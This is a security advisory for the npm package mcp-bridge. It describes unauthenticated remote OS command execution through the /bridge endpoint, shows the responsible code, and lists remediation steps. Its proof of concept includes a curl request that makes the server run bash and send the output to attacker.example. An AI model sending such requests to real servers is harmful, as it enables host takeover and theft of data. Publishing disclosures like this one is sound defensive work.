# [C] MCP Connect has unauthenticated remote OS command execution via /bridge endpoint

## Summary
Severity: Critical
Advisory: GHSA-wvr4-3wq4-gpc5
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-wvr4-3wq4-gpc5
Type: github-advisory

## Affected
- npm: `mcp-bridge` — affected >=0

## Details
### Summary
When _AUTH_TOKEN_ and _ACCESS_TOKEN_ environment variables are not set (which is the default out-of-the-box configuration) the _/bridge_ HTTP endpoint is completely unauthenticated. Any network-accessible caller can POST a request with an attacker-controlled serverPath and args payload, causing the server to spawn an arbitrary OS process as the user running mcp-bridge. This results in full remote code execution on the host without any credentials.

### Details
**Root cause 1 - Authentication not enforced when token is absent**
_src/config/config.ts_ line 161 sets authToken to an empty string when neither environment variable is configured:
```
authToken: process.env.AUTH_TOKEN || process.env.ACCESS_TOKEN || '',
```
The auth middleware in _src/server/http-server.ts_ lines 118–141 wraps all enforcement in if (_this.accessToken_). Because an empty string is falsy in JavaScript, the entire block is skipped and next() is called unconditionally for every request:
```
if (this.accessToken) {  
// ... token validation - never reached when token is ''}
next(); // always reached in default config
```
The only consequence of a missing token is a log warning (line 42–43). The server starts and serves requests normally.

**Root cause 2 - _/bridge_ spawns arbitrary processes from request body input**
_src/server/http-server.ts_ lines 194 and 218/227 extract _serverPath_ and _args_ directly from the untrusted JSON body and pass them to _MCPClientManager.createClient()_ without any validation:
```
const { serverPath, method, params, args, env } = req.body;
// ...
clientId = await this.mcpClient.createClient(serverPath, args, env);
```
_src/client/mcp-client-manager.ts_ lines 68–75 fall through to _StdioClientTransport_ for any value that is not a valid HTTP/WS URL, using _serverPath_ as the executable command verbatim:
```
transport = new StdioClientTransport({  
command: serverPath,  
args: args || [],  
env: { ...getDefaultEnvironment(), ...(env || {}) }
});
```
There is no allow-list, no path restriction, and no sanitization. Any binary reachable from the server's PATH (including bash, sh, python, node, etc) can be invoked with arbitrary arguments.

#### Exposure surface
Express's _app.listen(port)_ binds to all interfaces _(0.0.0.0)_ by default, making the service immediately reachable over the network on any cloud VM or container. The project additionally ships an explicit _start:tunnel_ npm script that uses ngrok to publish the server to a public internet URL, maximising the attack surface.

### PoC
Start the server with no auth token configured (the default):
```
npm run build && npm start
# No AUTH_TOKEN set — server starts on port 3000, all interfaces
```
Send a crafted request from any machine that can reach port 3000:
```
curl -X POST http://<host>:3000/bridge \  
-H 'Content-Type: application/json' \  
-d '{    
"serverPath": "bash",    
"args": ["-lc", "id > /tmp/pwned && curl -d @/tmp/pwned https://attacker.example/exfil"],    
"method": "tools/list",    
"params": {}  
}'
```
The server spawns _bash_ as the _mcp-bridge_ process user. The command executes, the file is written, and the HTTP response will contain the error from the MCP handshake failing (but the payload has already run).
For internet-exposed instances (tunnel mode), replace _<host>_ with the ngrok public URL.

### Impact
Any unauthenticated attacker with network access to the server can execute arbitrary OS commands as the user running _mcp-bridge._ This permits full host compromise including: credential and secret theft from the environment, installation of persistent backdoors, lateral movement to internal systems, and complete data destruction.
Deployments most at risk are:

- Instances started with _npm run start:tunnel_ or _npm run dev:tunnel_ (direct internet exposure via ngrok)
- Any instance running on a cloud VM, container, or host without a network firewall restricting port 3000

The vulnerability is trivially exploitable with a single curl command and requires no prior knowledge of the target beyond its IP address and port.


### Remediation

1. Treat a missing _AUTH_TOKEN_ as a fatal startup error. Replace the warning at _http-server.ts:41–43_ with a thrown exception so the server refuses to start without a configured secret.
2. Invert the auth guard logic. Deny all requests when _authToken_ is empty rather than allowing them.

## References
- https://github.com/EvalsOne/MCP-connect/security/advisories/GHSA-wvr4-3wq4-gpc5
- https://github.com/EvalsOne/MCP-connect
